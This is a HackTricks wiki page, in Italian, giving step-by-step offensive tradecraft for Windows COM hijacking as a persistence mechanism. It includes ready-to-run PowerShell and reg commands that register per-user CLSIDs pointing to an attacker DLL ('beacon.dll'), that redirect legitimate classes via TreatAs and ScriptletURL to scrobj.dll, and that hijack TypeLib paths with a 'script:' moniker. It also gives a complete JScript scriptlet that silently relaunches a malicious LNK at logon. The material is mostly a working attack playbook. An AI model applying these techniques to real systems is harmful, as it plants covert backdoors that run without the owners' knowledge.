# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Ricerca di componenti COM inesistenti

Poiché i valori di HKCU possono essere modificati dagli utenti, **COM Hijacking** può essere usato come **meccanismo di persistenza**. Utilizzando `procmon` è facile trovare chiavi di registro COM cercate ma non ancora esistenti, che potrebbero essere create da un attacker. Filtri classici:

- operazioni **RegOpenKey**.
- dove il _Result_ è **NAME NOT FOUND**.
- e il _Path_ termina con **InprocServer32**.

Variazioni utili durante il hunting:

- Cercare anche chiavi **`LocalServer32`** mancanti. Alcune classi COM sono server out-of-process e avvieranno un EXE controllato dall'attacker invece di una DLL.
- Cercare le operazioni di registro **`TreatAs`** e **`ScriptletURL`**, oltre a `InprocServer32`. I contenuti recenti sulle detection e le analisi dei malware le evidenziano spesso perché sono molto più rare delle normali registrazioni COM e hanno quindi un alto valore indicativo.
- Copiare il **`ThreadingModel`** legittimo da `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` quando si clona una registrazione in HKCU. L'utilizzo del modello errato spesso interrompe l'attivazione e rende il hijack più evidente.<sup>[[3]](#references)</sup>
- Sui sistemi a 64 bit, esaminare entrambe le viste a 64 e 32 bit (`procmon.exe` e `procmon64.exe`, `HKLM\Software\Classes` e `HKLM\Software\Classes\WOW6432Node`), perché le applicazioni a 32 bit potrebbero risolvere una registrazione COM diversa.

Dopo aver deciso quale COM inesistente impersonare, eseguire i comandi seguenti. _Prestare attenzione se si decide di impersonare un COM che viene caricato ogni pochi secondi, poiché potrebbe essere eccessivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks usano Custom Triggers per chiamare oggetti COM e, poiché vengono eseguiti tramite Task Scheduler, è più facile prevedere quando verranno attivati.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Controllando l'output, puoi selezionarne uno che verrà eseguito **ogni volta che un utente effettua il log in**, ad esempio.

Ora, cercando il CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID**, nonché in HKLM e HKCU, di solito scoprirai che il valore non esiste in HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Quindi, puoi semplicemente creare la voce HKCU e, ogni volta che l'utente effettua l'accesso, il tuo backdoor verrà eseguito.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` consente di emulare un CLSID tramite un altro. <sup>[[4]](#references)</sup> Dal punto di vista offensivo, questo significa che puoi lasciare invariato il CLSID originale, creare un secondo CLSID per-utente che punti a `scrobj.dll` e quindi reindirizzare il vero oggetto COM a quello malevolo con `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Questo è utile quando:

- l'applicazione target istanzia già un CLSID stabile all'accesso o all'avvio dell'applicazione
- vuoi un reindirizzamento gestito solo tramite il registro invece di sostituire l'originale `InprocServer32`
- vuoi eseguire uno scriptlet `.sct` locale o remoto tramite il valore `ScriptletURL`

Flusso di lavoro di esempio (adattato dal tradecraft pubblico di Atomic Red Team e da precedenti ricerche sull'abuso del registro COM):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Note:

- `scrobj.dll` legge il valore `ScriptletURL` ed esegue il `.sct` indicato, quindi puoi mantenere il payload come file locale oppure recuperarlo da remoto tramite HTTP/HTTPS.
- `TreatAs` è particolarmente utile quando la registrazione COM originale è completa e stabile in HKLM, perché è sufficiente un piccolo redirect per-utente invece di replicare l'intero albero.
- Per la validation senza attendere il trigger naturale, puoi istanziare manualmente il ProgID/CLSID falso con `rundll32.exe -sta <ProgID-or-CLSID>` se la classe target supporta l'attivazione STA.

## COM TypeLib Hijacking (script: moniker persistence)

Le Type Libraries (TypeLib) definiscono le interfacce COM e vengono caricate tramite `LoadTypeLib()`. Quando viene istanziato un COM server, il sistema operativo può caricare anche la TypeLib associata consultando le registry keys in `HKCR\TypeLib\{LIBID}`. Se il percorso della TypeLib viene sostituito con un **moniker**, ad esempio `script:C:\...\evil.sct`, Windows eseguirà lo scriptlet quando la TypeLib viene risolta, ottenendo una persistence stealthy che si attiva quando vengono utilizzati componenti comuni.

Questo è stato osservato contro il controllo Microsoft Web Browser (caricato frequentemente da Internet Explorer, dalle app che incorporano WebBrowser e persino da `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Steps (PowerShell)

1) Identifica la TypeLib (LIBID) utilizzata da un CLSID ad alta frequenza. Esempio di CLSID spesso abusato dalle malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Indirizza il percorso TypeLib per utente a uno scriptlet locale usando il moniker `script:` (non sono richiesti diritti di amministratore):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Posiziona un file JScript `.sct` minimale che rilanci il payload principale (ad esempio, un `.lnk` utilizzato dalla catena iniziale):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – l'apertura di IE, di un'applicazione che incorpora il controllo WebBrowser o anche una normale attività di Explorer caricherà la TypeLib ed eseguirà lo scriptlet, riattivando la tua chain all'accesso/riavvio.

Pulizia
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Note
- Puoi applicare la stessa logica ad altri componenti COM ad alta frequenza; risolvi sempre prima il `LIBID` reale da `HKCR\CLSID\{CLSID}\TypeLib`.
- Sui sistemi a 64 bit puoi anche popolare la sottochiave `win64` per i consumer a 64 bit.

## Riferimenti

- [1] [Hijack the TypeLib – Nuova tecnica di persistenza COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Campagna ZipLine: un sofisticato attacco di phishing mirato alle aziende statunitensi](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rivisitazione del COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Chiave CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
